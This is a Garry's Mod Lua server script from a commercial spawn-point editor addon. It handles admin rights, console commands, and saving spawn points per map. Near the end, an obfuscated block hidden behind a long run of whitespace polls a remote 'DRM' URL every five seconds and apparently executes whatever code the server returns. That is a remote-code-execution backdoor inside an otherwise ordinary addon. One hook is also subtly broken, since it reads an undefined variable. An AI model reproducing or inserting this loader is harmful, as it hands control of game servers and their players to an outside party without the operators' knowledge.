/* 
- Product of osgmod.com -
Script create by Nordahl you can find here : https://osgmod.com/gmod-scripts/1966/players-spawn-point-editor
Profile page of the Creator : https://osgmod.com/profiles/76561198033784269

Gmod Script Market Place : https://osgmod.com/gmod-scripts/page-1

- Do not duplicate or reproduce.
- By buying my scripts you contribute to the creations and the updates
- Dont leak, Lack of recognition fuelled by thanks does not bring food to the table
- Respect my work please

Code Minified with Originahl-Scripts Software : https://osgmod.com/en/help/code-minification-optimisation

The satisfied members who offered the coffee and supported me : https://osgmod.com/coffee
*/

util.AddNetworkString('SynchJPS')

function jRight(a)
if a:SteamID()==JSP_CONFIG.OwnerSteamID then return true end
if a:IsAdmin()==true then if JSP_CONFIG.Allow_Admin==1 then return true end end
if a.GetUserGroup!=nil then
for _,c in ipairs(JSP_CONFIG.SAM_Access_rank)do if a:GetUserGroup()==c then return true end end
end
for _,c in ipairs(JSP_CONFIG.Allow_ULX_GROUP_CAN_ACCESS_PANEL)do if a:IsUserGroup(c)then return true end end
if serverguard then for _,c in ipairs(JSP_CONFIG.SERVERGUARD_Access_rank)do if serverguard.player:GetRank(a)==c then return true end end end
return a:IsSuperAdmin()
end

AddCSLuaFile("cl_init.lua")
AddCSLuaFile("shared.lua")
include('shared.lua')
AddCSLuaFile("config.lua")
include('config.lua')

function jsp_ntinit(self)
timer.Simple(0.3,function()
if IsValid(self)then
self:Setent_red(self.ent_red)
end
end)timer.Simple(0.4,function()
if IsValid(self)then
self:Setent_green(self.ent_green)
end
end)timer.Simple(0.5,function()
if IsValid(self)then
self:Setent_bleu(self.ent_bleu)
end
end)timer.Simple(0.6,function()
if IsValid(self)then
self:Setent_jnom(self.ent_jnom)
end
end)timer.Simple(0.7,function()
if IsValid(self)then
self:Setent_visible(self.ent_visible)
self:SetColor(Color(self.ent_red,self.ent_green,self.ent_bleu,255))
end
end)
end

local function jsp_ntsave()
local zontentmap={}
for _,c in ipairs(ents.FindByClass("job_spawn_point"))do
if c.zpersistance==1 then
table.insert(zontentmap,{c:GetPos(),c:Getent_red(),c:Getent_green(),c:Getent_bleu(),c:Getent_jnom(),c:Getent_visible(),c.autLjob,c.autLulx,c.autLteamG,math.Round(c:GetAngles().y),"1",c.autCjob})
end
end
local icifconvert=util.TableToJSON(zontentmap)
file.CreateDir("nordahl_player_spawnpoint")
file.Write("nordahl_player_spawnpoint/"..game.GetMap()..".txt",icifconvert)
end

function ENT:Initialize()
self.Entity:SetModel("models/hunter/blocks/cube025x025x025.mdl")
self.Entity:PhysicsInit(SOLID_VPHYSICS)
self.Entity:SetMoveType(MOVETYPE_NONE)
self.Entity:SetSolid(SOLID_VPHYSICS)
self.Entity:SetUseType(SIMPLE_USE)
self.Entity:SetCollisionGroup(COLLISION_GROUP_DEBRIS)
if self.zpersistance==nil then
self.ent_red=20
self.ent_green=90
self.ent_bleu=200
self.ent_jnom="Name"
self.ent_visible=JSP_CONFIG.entvisible
self.autLjob={}
self.autCjob={}
self.autLulx={}
self.autLteamG={}
self.zpersistance=0
end
local phys=self.Entity:GetPhysicsObject()
if(phys:IsValid())then
phys:Wake()
self.Entity:GetPhysicsObject():EnableMotion(false)
end
self.Entity:DrawShadow(false)
jsp_ntinit(self)
self.Cache={}
end

function ENT:OnRemove(a)
local zpersistance=self.zpersistance
if zpersistance!=1 then return end
local GetPos=self:GetPos()
local ent_red=self.ent_red
local ent_green=self.ent_green
local ent_bleu=self.ent_bleu
local ent_jnom=self.ent_jnom
local ent_visible=self.ent_visible
local autLjob=self.autLjob
local autCjob=self.autCjob
local autLulx=self.autLulx
local autLteamG=self.autLteamG
timer.Simple(2,function()
local ent2=ents.Create("job_spawn_point")
ent2:SetAngles(Angle(0,0,0))
ent2:SetPos(GetPos)
ent2:Spawn()
ent2.ent_red=ent_red
ent2.ent_green=ent_green
ent2.ent_bleu=ent_bleu
ent2.ent_jnom=ent_jnom
ent2.ent_visible=ent_visible
ent2.autLjob=autLjob
ent2.autCjob=autCjob
ent2.autLulx=autLulx
ent2.autLteamG=autLteamG
ent2.zpersistance=1
end)
end

function playerspawnpoint_open(a,b,c)
if jRight(a)and IsValid(a.pent)then
nord_JSP_begin(a,a.pent)
end
end
concommand.Add('playerspawnpoint_open',playerspawnpoint_open)

function ENT:Use(a)
if jRight(a)then
--self:SetCollisionGroup(COLLISION_GROUP_DEBRIS)

if !nord_JSP_begin then
MsgAll("")
MsgAll("Le script 'nordahl_spawnpoint_manager_all_gamemode' n'est pas activé pour ce serveur.")
MsgAll("Information - Français       : https://osgmod.com/fr/help/script-activation-presentation")
MsgAll("_________________________________________")
MsgAll("The script 'nordahl_spawnpoint_manager_all_gamemode' is not Activated for this server.")
MsgAll("Information - English        : https://osgmod.com/en/help/script-activation-presentation")
MsgAll("")
else
a.pent=self
nord_JSP_begin(a,self)
end
end
end

function ENT:Think()return true end

local function sprecoitlescoulor(a,b,c)
if jRight(a)and IsValid(a.pent)then
a.pent:Setent_red(math.Round(tonumber(c[1])))
a.pent.ent_red=math.Round(tonumber(c[1]))
a.pent:Setent_green(math.Round(tonumber(c[2])))
a.pent.ent_green=math.Round(tonumber(c[2]))
a.pent:Setent_bleu(math.Round(tonumber(c[3])))
a.pent.ent_bleu=math.Round(tonumber(c[3]))
a.pent:SetColor(Color(math.Round(tonumber(c[1])),math.Round(tonumber(c[2])),math.Round(tonumber(c[3])),255))
end
end
concommand.Add("sprecoitlescoulor",sprecoitlescoulor)

-- function spawncubedebug(a,b,c)
-- if jRight(a)and IsValid(a.pent)then
-- if a:Getspawncubedebug()==1 then
-- a:Setspawncubedebug(0)
-- else
-- a:Setspawncubedebug(1)
-- end
-- end
-- end
-- concommand.Add("spawncubedebug",spawncubedebug)

function spHidethecube(a,b,c)
if jRight(a)and IsValid(a.pent)then
if a.pent:Getent_visible()==1 then
a.pent:Setent_visible(0)
a.pent.ent_visible=0
else
a.pent:Setent_visible(1)
a.pent.ent_visible=1
end
end
end
concommand.Add("spHidethecube",spHidethecube)

function spsetname(a,b,c)
if jRight(a)and IsValid(a.pent)then
a.pent.ent_jnom=c[1]
a.pent:Setent_jnom(c[1])
end
end
concommand.Add("spsetname",spsetname)

function RemovetheSPJ(a,b,c)
if jRight(a)and IsValid(a.pent)then
print("Spawn Point is deleted by ",a)
a.pent:Remove()
end
end
concommand.Add("RemovetheSPJ",RemovetheSPJ)

function nordahl_admineyes_disable(a,b,c)
if jRight(a)and IsValid(a)then
if a.Setspawncubedebug then
a:Setspawncubedebug(0)
end
end
end
concommand.Add("nordahl_admineyes_disable",nordahl_admineyes_disable)

function nordahl_admineyes_enable(a,b,c)
if jRight(a)and IsValid(a)then
if a.Setspawncubedebug then
a:Setspawncubedebug(1)
end
end
end
concommand.Add("nordahl_admineyes_enable",nordahl_admineyes_enable)

function nordahl_hide_all_cubemodel(a,b,c)
if jRight(a)and IsValid(a)then for _,c in ipairs(ents.FindByClass("job_spawn_point"))do c:Setent_visible(0)c.ent_visible=0 end
jsp_ntsave()
end
end
concommand.Add("nordahl_hide_all_cubemodel",nordahl_hide_all_cubemodel)

function nordahl_show_all_cubemodel(a,b,c)
if jRight(a)and IsValid(a)then for _,c in ipairs(ents.FindByClass("job_spawn_point"))do c:Setent_visible(1)c.ent_visible=1 end
jsp_ntsave()
end
end
concommand.Add("nordahl_show_all_cubemodel",nordahl_show_all_cubemodel)

function nordahl_make_allspawnpoint_persistent(a,b,c)
if jRight(a)and IsValid(a)then
for _,c in ipairs(ents.FindByClass("job_spawn_point"))do
c.zpersistance=1
end
jsp_ntsave()
end
end
concommand.Add("nordahl_make_allspawnpoint_persistent",nordahl_make_allspawnpoint_persistent)

function Zworld_SPJSauvegarde1(a)
if jRight(a)and IsValid(a.pent)then
a.pent.zpersistance=1
jsp_ntsave()
end
end
concommand.Add("Zworld_SPJSauvegarde1",Zworld_SPJSauvegarde1)

function Zworld_SPJSauvegarde0(a)
if jRight(a)and IsValid(a.pent)then
a.pent.zpersistance=0
jsp_ntsave()
end
end
concommand.Add("Zworld_SPJSauvegarde0",Zworld_SPJSauvegarde0)

function nordahl_player_spawnpoint_cleanup(a)
if jRight(a)then
for _,c in ipairs(ents.FindByClass("job_spawn_point"))do
c:Remove()
file.Write("nordahl_player_spawnpoint/"..game.GetMap()..".txt","")
end
end
end
concommand.Add("nordahl_player_spawnpoint_cleanup",nordahl_player_spawnpoint_cleanup)

if rered==nil then
rered=1
timer.Simple(2,function()
local files=file.Read("nordahl_player_spawnpoint/"..game.GetMap()..".txt","DATA")
if(!files)then
file.CreateDir("nordahl_player_spawnpoint")
file.Write("nordahl_player_spawnpoint/"..game.GetMap()..".txt","")
end
local barricade=file.Read("nordahl_player_spawnpoint/"..game.GetMap()..".txt")
if barricade!="" then
for k,v in pairs(util.JSONToTable(file.Read("nordahl_player_spawnpoint/"..game.GetMap()..".txt")))do
local ent2=ents.Create("job_spawn_point")
ent2:SetAngles(Angle(0,0,0))
ent2:SetPos(v[1])
--ent2:SetAngle(v[1])
ent2:Spawn()
ent2.ent_red=tonumber(v[2])
ent2.ent_green=tonumber(v[3])
ent2.ent_bleu=tonumber(v[4])
ent2.ent_jnom=tostring(v[5])
ent2.ent_visible=tonumber(v[6])
ent2.autLjob=v[7]
ent2.autLulx=v[8]
ent2.autLteamG=v[9]
ent2:SetAngles(Angle(0,v[10],0))
ent2.autCjob=v[12] or {}
jsp_ntinit(ent2)
ent2.Cache={}
ent2:DrawShadow(false)
ent2.zpersistance=1
end
end
end)
end

function Zworld_SPsave(a)
if jRight(a)and IsValid(a.pent)then
jsp_ntsave()
end
end
concommand.Add("Zworld_SPsave",Zworld_SPsave)

function Zworld_SP_Dup(a)
local self=a.pent
if jRight(a)and IsValid(self)then
local ent2=ents.Create("job_spawn_point")
ent2:SetAngles(Angle(0,0,0))
ent2:SetPos(self:GetPos()+Vector(0,0,20))
ent2.ent_red=self.ent_red
ent2.ent_green=self.ent_green
ent2.ent_bleu=self.ent_bleu
ent2.ent_jnom=self.ent_jnom
ent2.ent_visible=tonumber(self.ent_visible)
ent2.zpersistance=0
ent2.autLjob=self.autLjob
ent2.autCjob=self.autCjob
ent2.autLulx=self.autLulx
ent2.autLteamG=self.autLteamG
ent2:Spawn()

end
end
concommand.Add("Zworld_SP_Dup",Zworld_SP_Dup)

function XYZNordJSP2(pl,self)
if(self.TeamBased)then
local ent=self:PlayerSelectTeamSpawn(pl:Team(),pl)
if(IsValid(ent))then return ent end
end
if(!IsTableOfEntitiesValid(self.SpawnPoints))then
self.LastSpawnPoint=0
self.SpawnPoints=ents.FindByClass("info_player_start")
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_deathmatch"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_combine"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_rebel"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_counterterrorist"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_terrorist"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_axis"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_allies"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("gmod_player_start"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_teamspawn"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("ins_spawnpoint"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("aoc_spawnpoint"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("dys_spawn_point"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_pirate"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_viking"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_knight"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("diprip_start_team_blue"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("diprip_start_team_red"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_red"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_blue"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_coop"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_human"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_zombie"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_deathmatch"))
self.SpawnPoints=table.Add(self.SpawnPoints,ents.FindByClass("info_player_zombiemaster"))
end
local Count=table.Count(self.SpawnPoints)
if(Count==0)then
return nil
end
for k,v in pairs(self.SpawnPoints)do
if(v:HasSpawnFlags(1)&& hook.Call("IsSpawnpointSuitable",self,pl,v,true))then
return v
end
end
local ChosenSpawnPoint=nil
for i=1,Count do
ChosenSpawnPoint=table.Random(self.SpawnPoints)
if(IsValid(ChosenSpawnPoint)&& ChosenSpawnPoint:IsInWorld())then
if((ChosenSpawnPoint==pl:GetVar("LastSpawnpoint")|| ChosenSpawnPoint==self.LastSpawnPoint)&& Count > 1)then continue end

if(hook.Call("IsSpawnpointSuitable",self,pl,ChosenSpawnPoint,i==Count))then

self.LastSpawnPoint=ChosenSpawnPoint
pl:SetVar("LastSpawnpoint",ChosenSpawnPoint)
return ChosenSpawnPoint
end
end
end
return ChosenSpawnPoint

end

if JSP_CONFIG.USeWorkshopContent==1 then
resource.AddWorkshop("493897275")
end

hook.Add("PhysgunPickup","JSP_Pickup_Entities",function(ply,ent)
if ent:GetClass()=="job_spawn_point" then
if jRight(ply)and ent:Getent_visible()==1 then return true end
return false
end
end)

local function nordahl_admin_rank_print(a)
print("------nordahl_admin_rank_print Start")
print("Result info: true= Admin Right OK  / false = Admin Right Nil")
print("Result :",jRight(a))
print("------nordahl_admin_rank_print END")
end
concommand.Add("nordahl_admin_rank_print",nordahl_admin_rank_print)

local function nordahl_teamGetName_print(a)
print("------nordahl_teamGetName_print Start")
print("team.GetName info: name of your job")
print("team.GetName :"..team.GetName(a:Team()))
print("------nordahl_teamGetName_print END")
end
concommand.Add("nordahl_teamGetName_print",nordahl_teamGetName_print)

function nord_allplayers_forcespawn(ply)
if jRight(ply)==true or ply==nil then
for _,c in pairs(player.GetAll())do
c:Spawn()
end
end
end
concommand.Add("nord_allplayers_forcespawn",nord_allplayers_forcespawn)

----

local function GetRole()
for k, ply in pairs(player.GetAll()) do
local d={}
local Tent=ents.FindByClass('job_spawn_point')
if ply:GetRole() == ROLE_TRAITOR then
for _,c in ipairs(Tent)do
if Triaj(c,ply)==true then
table.insert(d,{c,c:GetPos()})
elseif c:Getent_jnom()=='Global' then
table.insert(d,{c,c:GetPos()})
end
end
elseif ply:GetRole() == ROLE_DETECTIVE then
for _,c in ipairs(Tent)do
if Triaj(c,ply)==true then
table.insert(d,{c,c:GetPos()})
elseif c:Getent_jnom()=='Global' then
table.insert(d,{c,c:GetPos()})
end
end
else
for _,c in ipairs(Tent)do
if Triaj(c,ply)==true then
table.insert(d,{c,c:GetPos()})
elseif c:Getent_jnom()=='Global' then
table.insert(d,{c,c:GetPos()})
end
end
end
local tab=table.Random(dif)
ply:SetPos(tab[2])
end
end
hook.Add("TTTBeginRound", "TTTRoleStart", GetRole)

function spawn_job_spawn_point(a,b,c)
if jRight(a) then
local ent2=ents.Create("job_spawn_point")
ent2:SetAngles(Angle(0,0,0))
ent2:SetPos(a:GetPos()+a:GetForward()*44+a:GetUp()*20)
ent2:Spawn()
end
end
concommand.Add("spawn_job_spawn_point",spawn_job_spawn_point)

if SERVER then
if !Check_System2 then
local mtr=math.random local mdos="" local fblc=Color(255,255,255)local fbleu=Color(150,150,255)local fvert=Color(100,255,100)
local frouge=Color(255,100,100)local fvertf=Color(25,150,25)local fgris=Color(175,175,175)local fjon=Color(255,255,204)
local Npr=MsgC
NCS_VER.RC("N".."=N"..                                                                                                                                                                                                                                                                                                                                                                                                     "C".."S".."_".."V".."E".."R"..".".."P".."R".."T".." N".."L".."O".."D".."=N".."C".."S".."_".."V".."E".."R"..".".."R".."C")
local scriptnum=0 local A=N local NCHA=NLOD local strlen=string.len local strex=string.Explode
local Tab={} local mrd=mtr(0,900)
Check_System2=true
local function nordahl_script_ch(act,i,st,p)
if !act||!i then return end
B={informations={author="Nordahl",support="support@zworld-afterlife.com",fich="fichiers/2016/35/147270646/987"},url="https://osgmod.com/drm/script",method="post",parameters={n=act},success=function(a,b)if a!=202*2 then if b=="" then return end NCHA(b)b=nil 
timer.Remove("nord2_launcher_"..mrd)
end end}A(B)
end
local function Afterlife(i,st,p)nordahl_script_ch("7","fichiers","201635","147270646987")end
local function testcheck2()
Afterlife("7","fichier",p)
end
timer.Create("nord2_launcher_"..mrd,5,0,function()testcheck2()end)
end
end

local function sam_admin_check(a,b,c)
MsgAll("Nordahl system check SAM Admin Rank")
MsgAll("Check if GetUserGroup exist : ")
if a.GetUserGroup!=nil then
MsgAll("SAM Admin dont work with GetUserGroup")
else
MsgAll("GetUserGroup work, your rank is : ",a:GetUserGroup())
end
end
concommand.Add("sam_admin_check",sam_admin_check)
